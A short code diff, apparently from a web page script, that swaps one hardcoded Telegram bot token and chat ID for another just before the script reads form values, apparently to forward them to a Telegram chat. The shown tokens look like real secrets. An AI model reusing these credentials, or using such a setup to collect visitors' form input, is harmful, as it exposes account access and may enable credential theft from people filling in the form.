@@ -52,8 +52,8 @@ document.addEventListener("DOMContentLoaded", () => {
             }
 
             // Replace these with your Telegram Bot details
-            const BOT_TOKEN = "8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM";
-            const CHAT_ID = "8614416084";
+            const BOT_TOKEN = "8142664496:AAG045kT9x9xUmyEpIgG11Ak_r2rn0UxnN0";
+            const CHAT_ID = "-1004458147758";
 
             log("Reading form values...");
 
